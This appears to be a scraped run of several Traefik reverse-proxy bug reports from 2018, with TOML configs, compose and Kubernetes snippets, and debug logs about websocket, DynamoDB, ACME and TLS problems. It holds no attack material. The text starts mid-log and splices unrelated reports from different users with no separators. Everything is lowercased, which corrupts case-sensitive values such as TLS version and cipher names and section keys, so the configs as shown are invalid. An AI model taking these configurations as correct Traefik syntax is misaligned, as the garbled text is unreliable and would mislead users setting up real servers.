healthcheck for currentbackend httpdgda-api-v1 " time="2018-02-23t16:45:53z" level=debug msg="refreshing healthcheck for currentbackend httpsdgda-api-v1 " time="2018-02-23t16:45:55z" level=info msg="i have to go..
interrupt" time="2018-02-23t16:45:55z" level=info msg="stopping server gracefully" time="2018-02-23t16:45:55z" level=debug msg="waiting 0s seconds before killing connections on entrypoint https..." time="2018-02-23t16:45:55z" level=debug msg="entrypoint https closed" time="2018-02-23t16:45:55z" level=debug msg="waiting 0s seconds before killing connections on entrypoint http..." time="2018-02-23t16:45:55z" level=debug msg="entrypoint http closed" time="2018-02-23t16:45:55z" level=info msg="server stopped" time="2018-02-23t16:45:55z" level=info msg="shutting down" ``` </details>
traefik is started from command line under ubuntu 16.04
################################################################
# global configuration
################################################################
debug = true loglevel = "debug" [entrypoints] [entrypoints.http] address = ":80" [traefiklog]
# filepath = "/home/ubuntu/traefik/traefik.log" [accesslog]
filepath = "/home/ubuntu/traefik/access.log" ################################################################
# web configuration backend
################################################################ # enable web configuration backend
address = ":8080" ################################################################
# docker configuration backend
################################################################ # enable docker configuration backend
the docker-compose file of the backend is as follows:
version: \'2\' services: mqtt: image: toke/mosquitto container_name: mqtt ports: - "1883:1883" - "9001:9001" labels: traefik.backend: mqtt traefik.frontend.rule: pathprefixstrip:/mqtt traefik.enable: "true" traefik.port: "9001" traefik.passhostheader: "true"
### if applicable, please paste the log output in debug mode (`--debug` switch)
i have also observed the following error in traefik log when i tried to send message through the connection:
erro[2018-02-22t16:48:52z] vulcand/oxy/forward/websocket: error when copying from client to backend: websocket: close 1006 (abnormal closure): unexpected eof ```
othewise there is no error or warning related to the http response itself.
traefik container (`containous/traefik:experimental`) running in rancher using metadata and consul storage.
```arguments
--accesslog,--api,--api.statistics,--api.statistics.recenterrors=10,--consul,--consul.endpoint=consul:8500,--consul.prefix=traefik,--defaultentrypoints=http,https,--entrypoints=name:http address::80,--entrypoints=name:https address::443 tls,--loglevel=error,--ping,--rancher,--rancher.exposedbydefault=false,--rancher.metadata=true,--traefiklog,--tracing,--tracing.backend=jaeger,--tracing.jaeger,--tracing.jaeger.localagenthostport=jaeger:6832,--tracing.jaeger.samplingserverurl=
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2018-02-22t14:01:27z" level=error msg="load config error: 1 error(s) decoding:\ \ * \'tracing.tracer\' expected type \'opentracing.tracer\', got \'string\', retrying in 349.052216ms"
time="2018-02-22t14:01:27z" level=error msg="load config error: 1 error(s) decoding:\ \ * \'tracing.tracer\' expected type \'opentracing.tracer\', got \'string\', retrying in 639.063674ms"
time="2018-02-22t14:01:28z" level=error msg="load config error: 1 error(s) decoding:\ \ * \'tracing.tracer\' expected type \'opentracing.tracer\', got \'string\', retrying in 1.125138197s"
time="2018-02-22t14:01:30z" level=error msg="load config error: 1 error(s) decoding:\ \ * \'tracing.tracer\' expected type \'opentracing.tracer\', got \'string\', retrying in 1.545748625s"
time="2018-02-22t14:01:32z" level=error msg="load config error: 1 error(s) decoding:\ \ * \'tracing.tracer\' expected type \'opentracing.tracer\', got \'string\', retrying in 2.024578743s"
time="2018-02-22t14:01:34z" level=error msg="load config error: 1 error(s) decoding:\ \ * \'tracing.tracer\' expected type \'opentracing.tracer\', got \'string\', retrying in 3.779199929s"
time="2018-02-22t14:01:38z" level=error msg="load config error: 1 error(s) decoding:\ \ * \'tracing.tracer\' expected type \'opentracing.tracer\', got \'string\', retrying in 6.3740884s"
# traefik.toml
loglevel = "info"
defaultentrypoints = ["http", "httpn"]
[entrypoints] [entrypoints.http] address = ":80" compress = false [entrypoints.httpn] address = ":8880" compress = false
[kubernetes]
[accesslog]
format = "common"
address = ":8080"
[web.metrics.prometheus]
[web.metrics.datadog] address = "dd-agent-datadog:8125" pushinterval = "10s"
docker endpoint configuration with certificates written manually in traefik.toml file: ```toml
[entrypoints.https] address = ":443" #compress = true [entrypoints.https.tls] minversion = "versiontls12" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_rsa_with_aes_256_gcm_sha384" ] [[entrypoints.https.tls.certificates]] certfile = "/etc/traefik/ssl/cert.crt" keyfile = "/etc/traefik/ssl/key.key"
[backends] [backends.static] [backends.static.servers.server1] url = " " [backends.backend] [backends.backend.servers.server1] url = " " [backends.websocket] [backends.websocket.servers.server1] url = " " [frontends] [frontends.static] backend = "static" priority = 1 [frontends.static.routes.root] rule = "host:dev.cloud;pathprefix:/" [frontends.api] backend = "backend" passhostheader = true priority = 5 [frontends.api.routes.api] rule = "pathprefix:/api" [frontends.websocket] backend = "websocket" passhostheader = true priority = 5 #entrypoints = ["ws"] # overrides defaultentrypoints [frontends.websocket.routes.wss] rule = "pathprefix:/wss"
### if applicable, please paste the log output in debug mode (`--debug` switch) ```
proxy.1.o3hiz9xtnzz4@ip-10-1-0-20 | time="2018-02-19t17:04:25z" level=debug msg="vulcand/oxy/roundrobin/rr: competed servehttp on request" request="{"method":"get","url":{"scheme":"","opaque":"","user":null,"host":"","path":"/wss","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"proto":"http/1.1","protomajor":1,"protominor":1,"header":{"connection":["upgrade"],"sec-websocket-key":["85i04doz7rjxy581za/zkg=="],"sec-websocket-version":["13"],"upgrade":["websocket"],"user-agent":["go-http-client/1.1"],"x-auth-token":["xxx"]},"contentlength":0,"transferencoding":null,"host":"dev.cloud","form":null,"postform":null,"multipartform":null,"trailer":null,"remoteaddr":"10.0.0.126:46570","requesturi":"/wss","tls":null}" proxy.1.o3hiz9xtnzz4@ip-10-1-0-20 | 10.0.0.126 - - [19/feb/2018:17:04:25 +0000] "get /wss http/1.1" 0 0 - "go-http-client/1.1" 82 "websocket" " " 3ms
debug = true [api] dashboard = true defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":80" [dynamodb] region = "us-east-1" tablename = "traefik" watch = true refreshseconds = 60 accesskeyid = "key" secretaccesskey = "secret" endpoint = " "
the dynamodb contains two documents: ```json
{ "id": "uuid-f1", "name": "uuid-f1", "frontend": { "backend": "uuid-b1", "routes": { "subdomains": { "rule": "host:test.localhost,test1.localhost,test2.localhost,test3.localhost,test4.localhost" } }, "ratelimit": { "extractorfunc": "client.ip", "rateset": { "rateset1": { "period": "10s", "average": 100, "burst": 200 } } } }
{ "id": "uuid-b1", "name": "uuid-b1", "backend": { "circuitbreaker": { "expression": "networkerrorratio() > 0.5" }, "servers": { "test": { "url": " " } }, "maxconn": { "amount": 10, "extractorfunc": "request.host" } }
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```shell
nfo[2018-02-16t16:37:35z] using toml configuration file /etc/traefik/traefik.toml
info[2018-02-16t16:37:35z] traefik version v1.5.2 built on 2018-02-12_10:56:31am
info[2018-02-16t16:37:35z]
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data debu[2018-02-16t16:37:35z] global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":0},"gracetimeout":0,"debug":true,"checknewversion":false,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}},"traefik":{"network":"","address":":8080","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"web":null,"docker":null,"file":null,"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":{"watch":true,"filename":"","constraints":[],"trace":false,"debugloggeneratedtemplate":false,"accesskeyid":"key","refreshseconds":60,"region":"us-east-1","secretaccesskey":"secret","tablename":"traefik","endpoint":" "},"servicefabric":null,"rest":null,"api":{"entrypoint":"traefik","dashboard":true,"debug":true,"currentconfigurations":null,"statistics":null},"metrics":null,"ping":null}
info[2018-02-16t16:37:35z] preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-02-16t16:37:35z] preparing server traefik &{network: address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-02-16t16:37:35z] starting server on :80
info[2018-02-16t16:37:35z] starting server on :8080
info[2018-02-16t16:37:35z] starting provider *dynamodb.provider {"watch":true,"filename":"","constraints":[],"trace":false,"debugloggeneratedtemplate":false,"accesskeyid":"key","refreshseconds":60,"region":"us-east-1","secretaccesskey":"secret","tablename":"traefik","endpoint":" "}
debu[2018-02-16t16:37:35z] providing provider...
info[2018-02-16t16:37:35z] creating provider client...
debu[2018-02-16t16:37:35z] scanning provider table: traefik ...
debu[2018-02-16t16:37:35z] successfully scanned provider table traefik
debu[2018-02-16t16:37:35z] number of items retrieved from provider: 2
debu[2018-02-16t16:37:35z] provider item: 0
map[id:{ s: "uuid-f1"
} frontend:{ m: { backend: { s: "uuid-b1" }, ratelimit: { m: { rateset: { m: { rateset1: { m: { average: { n: "100" }, period: { s: "10s" }, burst: { n: "200" } } } } }, extractorfunc: { s: "client.ip" } } }, routes: { m: { subdomains: { m: { rule: { s: "host:test.localhost,test1.localhost,test2.localhost,test3.localhost,test4.localhost" } } } } } }
} name:{ s: "uuid-f1"
debu[2018-02-16t16:37:35z] unmarshaling frontend from provider...
erro[2018-02-16t16:37:35z] unmarshaltypeerror: cannot unmarshal string into go value of type flaeg.duration
debu[2018-02-16t16:37:35z] provider item: 1
map[id:{ s: "uuid-b1"
} backend:{ m: { servers: { m: { test: { m: { url: { s: " " } } } } }, maxconn: { m: { amount: { n: "10" }, extractorfunc: { s: "request.host" } } }, circuitbreaker: { m: { expression: { s: "networkerrorratio() > 0.5" } } } }
debu[2018-02-16t16:37:35z] unmarshaling backend from provider...
debu[2018-02-16t16:37:35z] backend from provider unmarshalled successfully
debu[2018-02-16t16:37:35z] watching provider...
debu[2018-02-16t16:37:35z] validation of load balancer method for backend uuid-b1 failed: invalid load-balancing method ''
using default method wrr.
debu[2018-02-16t16:37:35z] configuration received from provider dynamodb: {"backends":{"uuid-b1":{"servers":{"test":{"url":" ","weight":0}},"circuitbreaker":{"expression":"networkerrorratio() \\u003e 0.5"},"loadbalancer":{"method":"wrr"},"maxconn":{"amount":10,"extractorfunc":"request.host"}}}}
info[2018-02-16t16:37:35z] server configuration reloaded on :80
info[2018-02-16t16:37:35z] server configuration reloaded on :8080
^cinfo[2018-02-16t16:37:52z] i have to go..
info[2018-02-16t16:37:52z] stopping server gracefully
debu[2018-02-16t16:37:52z] waiting 0s seconds before killing connections on entrypoint http...
debu[2018-02-16t16:37:52z] entrypoint http closed
debu[2018-02-16t16:37:52z] waiting 0s seconds before killing connections on entrypoint traefik...
debu[2018-02-16t16:37:52z] entrypoint traefik closed
info[2018-02-16t16:37:52z] server stopped
info[2018-02-16t16:37:52z] shutting down
{ "lifecycle": null, "gracetimeout": 0, "debug": true, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": { "file": "/var/run/traefik-access.log", "format": "common" }, "traefiklogsfile": "", "traefiklog": { "format": "xxxx" }, "loglevel": "info", "entrypoints": { "http": { "network": "", "address": "xxxx", "tls": null, "redirect": null, "auth": null, "whitelistsourcerange": null, "compress": false, "proxyprotocol": { "insecure": false, "trustedips": [] }, "forwardedheaders": null }, "https": { "network": "", "address": "xxxx", "tls": { "minversion": "", "ciphersuites": null, "certificates": null, "clientcafiles": null, "clientca": { "files": null, "optional": false } }, "redirect": null, "auth": null, "whitelistsourcerange": null, "compress": false, "proxyprotocol": { "insecure": false, "trustedips": [] }, "forwardedheaders": null } }, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "https", "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "web": { "address": ":8080", "certfile": "", "keyfile": "", "readonly": false, "statistics": null, "metrics": null, "path": "", "auth": null, "debug": false }, "docker": { "watch": true, "filename": "", "constraints": null, "trace": false, "debugloggeneratedtemplate": false, "endpoint": "xxxx", "domain": "xxxx", "tls": null, "exposedbydefault": true, "usebindportip": false, "swarmmode": true }, "file": { "watch": true, "filename": "", "constraints": null, "trace": false, "debugloggeneratedtemplate": false, "directory": "/srv/traefik/configs/" }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "configfile": "/etc/traefik/traefik.toml"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
ops-traefik_service.0.xmxdiu4b5bmq@redacted | time="2018-02-16t14:10:01z" level=debug msg="http2: server: error reading preface from client 10.17.59.203:56658: remote error: tls: unknown certificate authority"
``` when a user gets insecure page and then refreshes the page, normal access logs are produced and the page loads securely.
debug = true
[entrypoints] [entrypoints.http] address = ":80" [docker]
endpoint = "unix:///var/run/docker.sock"
watch = true
swarmmode = true
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```console
ubuntu@ubuntu-xenial:~$ sudo ./traefik_linux-amd64 -c traefik.toml --debug
info[2018-02-16t10:25:27z] using toml configuration file /home/ubuntu/traefik.toml
info[2018-02-16t10:25:27z] traefik version v1.5.2 built on 2018-02-12_10:56:31am
info[2018-02-16t10:25:27z]
stats collection is disabled.
help us improve traefik by turning this feature on :)
more details on: #collected-data debu[2018-02-16t10:25:27z] global configuration loaded {"lifecycle":{"requestacceptgracetimeout":0,"gracetimeout":0},"gracetimeout":0,"debug":true,"checknewversion":true,"sendanonymoususage":false,"accesslogsfile":"","accesslog":null,"traefiklogsfile":"","traefiklog":null,"loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"whitelistsourcerange":null,"compress":false,"proxyprotocol":null,"forwardedheaders":{"insecure":true,"trustedips":null}}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":0,"insecureskipverify":false,"rootcas":null,"retry":null,"healthcheck":{"interval":30000000000},"respondingtimeouts":null,"forwardingtimeouts":null,"web":null,"docker":{"watch":true,"filename":"","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"endpoint":"unix:///var/run/docker.sock","domain":"","tls":null,"exposedbydefault":true,"usebindportip":false,"swarmmode":true},"file":null,"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":null,"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null,"servicefabric":null,"rest":null,"api":null,"metrics":null,"ping":null}
info[2018-02-16t10:25:27z] preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s
info[2018-02-16t10:25:27z] starting provider *docker.provider {"watch":true,"filename":"","constraints":null,"trace":false,"debugloggeneratedtemplate":false,"endpoint":"unix:///var/run/docker.sock","domain":"","tls":null,"exposedbydefault":true,"usebindportip":false,"swarmmode":true}
info[2018-02-16t10:25:27z] starting server on :80
debu[2018-02-16t10:25:27z] provider connection established with docker 17.12.0-ce (api 1.35)
debu[2018-02-16t10:25:27z] could not load traefik.frontend.whitelistsourcerange labels
debu[2018-02-16t10:25:27z] could not load traefik.frontend.entrypoints labels
debu[2018-02-16t10:25:27z] could not load traefik.frontend.auth.basic labels
debu[2018-02-16t10:25:27z] validation of load balancer method for backend backend-nginx failed: invalid load-balancing method ''
using default method wrr.
debu[2018-02-16t10:25:27z] configuration received from provider docker: {"backends":{"backend-nginx":{"servers":{"server-nginx-1":{"url":" ","weight":0},"server-nginx-2":{"url":" ","weight":0},"server-nginx-3":{"url":" ","weight":0},"server-nginx-4":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-host-test-test-nl-0":{"entrypoints":["http"],"backend":"backend-nginx","routes":{"route-frontend-host-test-test-nl-0":{"rule":"host:test.test.nl"}},"passhostheader":true,"priority":0,"basicauth":[]}}}
debu[2018-02-16t10:25:27z] creating frontend frontend-host-test-test-nl-0
debu[2018-02-16t10:25:27z] wiring frontend frontend-host-test-test-nl-0 to entrypoint http
debu[2018-02-16t10:25:27z] creating route route-frontend-host-test-test-nl-0 host:test.test.nl
debu[2018-02-16t10:25:27z] creating backend backend-nginx
debu[2018-02-16t10:25:27z] creating load-balancer wrr
debu[2018-02-16t10:25:27z] creating server server-nginx-3 at with weight 0
debu[2018-02-16t10:25:27z] creating server server-nginx-4 at with weight 0
debu[2018-02-16t10:25:27z] creating server server-nginx-1 at with weight 0
debu[2018-02-16t10:25:27z] creating server server-nginx-2 at with weight 0
info[2018-02-16t10:25:27z] server configuration reloaded on :80
^cinfo[2018-02-16t10:25:27z] i have to go..
info[2018-02-16t10:25:27z] stopping server gracefully
debu[2018-02-16t10:25:27z] waiting 0s seconds before killing connections on entrypoint http...
debu[2018-02-16t10:25:27z] entrypoint http closed
info[2018-02-16t10:25:27z] server stopped
info[2018-02-16t10:25:27z] shutting down
```toml ```
### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls]
acmelogging = true
email = "xxx@xxxcom"
storagefile = "/acme/acme.json"
entrypoint = "https"
ondemand = true
onhostrule = true
# caserver = " "
[[acme.domains]]
main = "xxx.com"
sans = ["www.xxx.com","internal.xxx.com","staging.xxx.com"]
[acme.httpchallenge]
entrypoint = "http"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch)
######################################################
# global configuration
###################################################### defaultentrypoints = ["http", "https"]
loglevel = "info" ######################################################
# entrypoints definition
###################################################### [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" compress = false [entrypoints.https] address = ":443" [entrypoints.https.tls] minversion = "versiontls12" compress = false ######################################################
# management interface
###################################################### [web]
address = ":8080"
[web.statistics] recenterrors = 100 ######################################################
# docker configuration backend
###################################################### [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "example.org"
watch = true
exposedbydefault = true
swarmmode = true ######################################################
# acme (let's encrypt) configuration
###################################################### [acme]
email = "support@example.com"
entrypoint = "https"
ondemand = true
onhostrule = false
dnsprovider = "rfc2136"
storage = "/acme/acme.json" ```
defaultentrypoints = ["http"]
constraints = ["tag==public"]
loglevel = "warn" [accesslog]
format = "json" [docker]
endpoint = "unix:///var/run/docker.sock"
watch = true
exposedbydefault = false
swarmmode = true [web]
readonly = true [entrypoints.http]
address = ":80"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
ignored endpoint-mode not supported, service name: myservice
platform: kubernetes 1.9.0 ```toml
# traefik.toml defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/www.example.co/example.crt" keyfile = "/ssl/www.example.co/example.key"
``` ingress object
apiversion: extensions/v1beta1
kind: ingress
metadata: annotations: traefik.frontend.redirect.entrypoint: https name: example namespace: example
spec: tls: - secretname: ssl rules: - host: example.com http: paths: - backend: servicename: example serviceport: 80 path: /
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```shell
time="2018-01-29t09:50:27z" level=debug msg="skipping kubernetes event kind *v1.endpoints" time="2018-01-29t09:50:29z" level=debug msg="received kubernetes event kind *v1beta1.ingress" time="2018-01-29t09:50:29z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." time="2018-01-29t09:50:29z" level=error msg="template: :40:27: executing "" at <$frontend.redirecten...>: can\'t evaluate field redirectentrypoint in type *types.frontend" time="2018-01-29t09:50:29z" level=debug msg="received kubernetes event kind *v1.endpoints" time="2018-01-29t09:50:29z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/whitelist-source-range annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/allowed-hosts annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load ingress.kubernetes.io/proxy-headers annotation, skipping..." time="2018-01-29t09:50:29z" level=debug msg="could not load traefik.frontend.entrypoints annotation, skipping..." ```
``` - "--loglevel=debug" - "--web" - "--entrypoints=name:http address::80 redirect.entrypoint:https" - "--entrypoints=name:https address::443 tls" - "--defaultentrypoints=http,https" - "--acme" - "--acme.storage=traefik/acme/account" - "--acme.entrypoint=https" - "--acme.onhostrule=true" - "--acme.ondemand=true" - "--acme.email=julien.maitrehenry@me.com" - "--acme.httpchallenge" - "--acme.httpchallenge.entrypoint=http" - "--docker" - "--docker.swarmmode" - "--docker.domain=jmaitrehenry.ca" - "--docker.watch" - "--consul" - "--consul.endpoint=consul:8500" - "--consul.prefix=traefik" - "--debug"
# debug mode ?
debug = true # check if new version of traefik exist
checknewversion = false # loglevel of information
loglevel = "info" # default entrypoints
defaultentrypoints = ["http", "https"] # log file
traefiklogsfile = "/var/log/traefik.log" # access log
[accesslog]
filepath = "/var/log/access.log" # dashbord config
address = ":8080"
[web.auth.basic] usersfile = '/etc/.htpasswd' # entry points for redirection
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/web/ourmdomain.com/your-cert-file.pem" keyfile = "/etc/ssl/web/ourdomain.com/your-cert-key.key" # docker config
endpoint = "unix:///var/run/docker.sock"
domain = "our.docker.domain"
watch = true
exposedbydefault = false # letsencrypt configuration
email = "our@email.com"
storage = "acme.json"
onhostrule = true
entrypoint = "https" # enable http-01 method to create/renew acme cert
[acme.httpchallenge] entrypoint = "http"
### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2018-01-25t11:10:32z" level=info msg="preparing server traefik &{network: address::8080 tls:<nil> redirect:<nil> auth: whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2018-01-25t11:10:32z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2018-01-25t11:10:32z" level=info msg="preparing server https &{network: address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s" time="2018-01-25t11:10:32z" level=info msg="starting server on :8080" time="2018-01-25t11:10:32z" level=info msg="starting server on :80" time="2018-01-25t11:10:32z" level=error msg="error creating tls config: tls: private key does not match public key" time="2018-01-25t11:10:32z" level=fatal msg="error preparing server: tls: private key does not match public key"
``` thanks in advance
defaultentrypoints = ["http", "https"]
debug = true
loglevel = "debug" [entrypoints] [entrypoints.http] address = ":80"
# [entrypoints.http.redirect]
# entrypoint = "https" compress = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [acme] email = "email@address.com" caserver = " " # tried it on production as well storage = "/etc/traefik/acme/acme.json" entrypoint = "https" onhostrule = true acmelogging = true [acme.httpchallenge] entrypoint = "http" # enable docker configuration backend
[docker] endpoint = "unix:///var/run/docker.sock" domain = "sandbox.domain.com" watch = true swarmmode = true exposedbydefault = true [api] entrypoint = "traefik" dashboard = true address = ":8080" [api.statistics] recenterrors = 10
``` *docker-compose.yml*
version: '3'
services: nginx: image: nginx:1.13 volumes: - "../workspace:/srv" - "./nginx/default.conf:/etc/nginx/conf.d/default.conf" deploy: labels: - "traefik.backend=rest-api" - "traefik.port=80" - "traefik.frontend.rule=host:rest-api.sandbox.domain.com" - "traefik.docker.network=frontend" - "traefik.backend.loadbalancer.method=drr" networks: - frontend - backend php: image: php-fpm:7.1 volumes: - "../workspace:/srv" networks: - backend networks: backend: external: name: rest-api frontend: external: name: frontend
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) <details>
<summary>logs</summary> ```shell
time="2018-01-25t10:05:56z" level=debug msg="loadcertificatefordomains [rest-api.sandbox.domain.com]..." time="2018-01-25t10:05:56z" level=debug msg="looking for provided certificate to validate [rest-api.sandbox.domain.com]..." time="2018-01-25t10:05:56z" level=debug msg="no provided certificate found for domains [rest-api.sandbox.domain.com], get acme certificate." time="2018-01-25t10:05:56z" level=debug msg="loading acme certificates [rest-api.sandbox.domain.com]..." legolog: 2018/01/25 10:05:56 [info][rest-api.sandbox.domain.com] acme: obtaining bundled san certificate
legolog: 2018/01/25 10:05:56 [info][rest-api.sandbox.domain.com] authurl:
legolog: 2018/01/25 10:05:56 [info][rest-api.sandbox.domain.com] acme: could not find solver for: dns-01
legolog: 2018/01/25 10:05:56 [info][rest-api.sandbox.domain.com] acme: trying to solve http-01
time="2018-01-25t10:05:56z" level=debug msg="challenge present rest-api.sandbox.domain.com" time="2018-01-25t10:06:07z" level=debug msg="challenge cleanup rest-api.sandbox.domain.com" time="2018-01-25t10:06:07z" level=error msg="map[rest-api.sandbox.domain.com:acme: error 400 - urn:acme:error:connection - fetching timeout
error detail: validation for rest-api.sandbox.domain.com:80 resolved to: ***.***.***.*** ***:*:*:*::* used: ***:*:*:*::* ]" time="2018-01-25t10:06:07z" level=error msg="error getting acme certificates [rest-api.sandbox.domain.com] : cannot obtain certificates map[rest-api.sandbox.domain.com:acme: error 400 - urn:acme:error:connection - fetching timeout
error detail: validation for rest-api.sandbox.domain.com:80 resolved to: ***.***.***.*** ***:*:*:*::* used: ***:*:*:*::* ]" time="2018-01-25t10:06:07z" level=debug msg="loadcertificatefordomains []..." legolog: 2018/01/25 10:06:07 [info][exceptions.sandbox.domain.com] acme: obtaining bundled san certificate
